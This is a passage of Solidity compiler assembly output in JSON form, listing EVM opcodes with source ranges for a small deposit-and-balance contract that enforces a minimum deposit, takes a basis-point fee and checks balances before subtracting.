										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "19"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "21"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "21"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "24"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "24"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 741,
											"end": 761,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 868,
											"end": 893,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "27"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "27"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 868,
											"end": 893,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 868,
											"end": 893,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 868,
											"end": 893,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 868,
											"end": 893,
											"name": "tag",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 868,
											"end": 893,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 868,
											"end": 893,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 868,
											"end": 893,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 868,
											"end": 893,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 2489,
											"end": 2798,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 2489,
											"end": 2798,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2489,
											"end": 2798,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 2489,
											"end": 2798,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 2489,
											"end": 2798,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 2489,
											"end": 2798,
											"name": "tag",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 2489,
											"end": 2798,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2489,
											"end": 2798,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 2489,
											"end": 2798,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 2489,
											"end": 2798,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2555,
											"end": 2558,
											"name": "PUSH",
											"source": 0,
											"value": "64"
										},
										{
											"begin": 2542,
											"end": 2551,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 2542,
											"end": 2558,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 2542,
											"end": 2558,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "PUSH",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "PUSH",
											"source": 0,
											"value": "496E73756666696369656E74206465706F736974000000000000000000000000"
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "tag",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 2533,
											"end": 2583,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2594,
											"end": 2602,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2626,
											"end": 2631,
											"name": "PUSH",
											"source": 0,
											"value": "2710"
										},
										{
											"begin": 2617,
											"end": 2623,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 2617,
											"end": 2623,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2617,
											"end": 2623,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2617,
											"end": 2623,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 2617,
											"end": 2623,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2617,
											"end": 2623,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 2617,
											"end": 2623,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 2617,
											"end": 2623,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2617,
											"end": 2623,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 2617,
											"end": 2623,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 2617,
											"end": 2623,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2605,
											"end": 2623,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 2605,
											"end": 2623,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2605,
											"end": 2614,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 2605,
											"end": 2623,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 2605,
											"end": 2631,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2605,
											"end": 2631,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 2605,
											"end": 2631,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2605,
											"end": 2631,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 2605,
											"end": 2631,
											"name": "tag",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 2605,
											"end": 2631,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2605,
											"end": 2631,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 2594,
											"end": 2631,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2594,
											"end": 2631,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2700,
											"end": 2703,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2688,
											"end": 2697,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 2688,
											"end": 2703,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2672,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2673,
											"end": 2683,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2684,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2664,
											"end": 2703,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2703,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2703,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2703,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2703,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2703,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2703,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2703,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2703,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2703,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 2664,
											"end": 2703,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2787,
											"end": 2790,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2770,
											"end": 2783,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 2770,
											"end": 2783,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2770,
											"end": 2790,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2770,
											"end": 2790,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2770,
											"end": 2790,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 2770,
											"end": 2790,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2770,
											"end": 2790,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 2770,
											"end": 2790,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2770,
											"end": 2790,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2770,
											"end": 2790,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2770,
											"end": 2790,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2770,
											"end": 2790,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 2770,
											"end": 2790,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2489,
											"end": 2798,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2489,
											"end": 2798,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3029,
											"end": 3030,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2992,
											"end": 3025,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "35"
										},
										{
											"begin": 3017,
											"end": 3024,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3000,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3001,
											"end": 3011,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3012,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3016,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "36"
										},
										{
											"begin": 2992,
											"end": 3016,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3025,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3025,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3025,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 2992,
											"end": 3025,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3025,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 2992,
											"end": 3025,
											"name": "tag",
											"source": 0,
											"value": "35"
										},
										{
											"begin": 2992,
											"end": 3025,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3030,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 2992,
											"end": 3030,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "DUP3",
											"source": 0
										},
										{
